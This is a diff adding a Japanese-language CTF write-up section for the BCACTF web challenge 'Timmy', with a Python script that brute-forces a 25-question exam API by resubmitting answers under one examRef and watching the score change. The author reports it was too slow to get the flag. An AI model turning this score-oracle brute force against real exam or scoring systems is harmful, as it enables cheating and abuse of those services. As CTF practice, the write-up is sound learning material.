@@ -514,6 +514,119 @@ Flag: `bcactf{wh0_kn0ws_4nym0r3_11fab08d769a}`
 
 <br /><br />
 <br /><br />
+## [Web]: Timmy (175 points)
+- - -
+### Challenge
+> Timmy Bobbins is struggling to pass his alchemy class. His teacher lets him retake the final exam as many times as he wants, but the questions are uniquely generated every time Timmy begins the exam. If Timmy's parents find out that he didn't pass the class, they will be very disappointed. Help Timmy score 25/25 on his impossible final exam so he can make his parents proud!
+<br /><br />
+http://challs.bcactf.com:14327
+
+<br>
+
+### (Unsolved)
+
+MCQ (Multiple Choice) の問題が25問出てきます。アクセスする度に問題は変わりますが、examRef で管理されていて同じ examRef を使えば2分間はやり直しが可能です。
+
+ということで以下のコードを書きました。
+
+いちおう動くのですが、2分以内に処理が終わらずに Flag は取れませんでした。
+
+urllib が遅いんですかね。速く動くコードを書くスキルを磨かなくては。。。
+
+
+```Python
+#!/usr/bin/env python3
+
+import json
+import urllib.request
+
+url = 'http://challs.bcactf.com:14327/api/exam/begin'
+data = {
+    "studentName":"aaaaa",
+}
+headers = {
+    'Content-Type': 'application/json',
+}
+
+# Begin to get "examRef"
+req = urllib.request.Request(url, json.dumps(data).encode(), headers)
+with urllib.request.urlopen(req) as res:
+    body = json.load(res)
+examRef = body['examRef']
+
+# Submit all '0'
+url = 'http://challs.bcactf.com:14327/api/exam/submit'
+answer = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]
+final_answer = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]
+data = {
+    "examRef":examRef,
+    "selections":answer,
+}
+req = urllib.request.Request(url, json.dumps(data).encode(), headers)
+with urllib.request.urlopen(req) as res:
+    body = json.load(res)
+    score = float(body['score'][:-1])
+
+print(answer)
+print(body['score'])
+print(body['passed'])
+print("")
+
+# Change the answer & submit
+for i in range(25): # 0~24
+    for j in range(1,5): # 1~4
+        answer[i] = j
+        data = {
+            "examRef":examRef,
+            "selections":answer,
+        }
+
+        req = urllib.request.Request(url, json.dumps(data).encode(), headers)
+        with urllib.request.urlopen(req) as res:
+            body = json.load(res)
+            print(answer)
+            print(body['score'])
+            print(body['passed'])
+
+            new_score = float(body['score'][:-1])
+            result = body['passed']
+
+            if new_score > score:
+                print("Up\n")
+                final_answer[i] = j
+                score = new_score
+                break
+
+            if new_score < score:
+                print("Down\n")
+                answer[i] = j - 1
+                final_answer[i] = j - 1
+                break
+
+            print("Same\n")
+
+            if result == True:
+                data = {
+                    "examRef":examRef,
+                    "selections":final_answer,
+                }
+                req = urllib.request.Request(url, json.dumps(data).encode(), headers)
+                with urllib.request.urlopen(req) as res:
+                    body = json.load(res)
+                    print(body)
+                break
+```
+
+<br />
+
+Official Writeup (solver)：
+
+https://github.com/BCACTF/bcactf-6.0/blob/main/timmy/solve.js
+
+
+
+<br /><br />
+<br /><br />
 ## [OSINT]: Japanese Lyrics OSINT (100 points)
 - - -
 ### Challenge
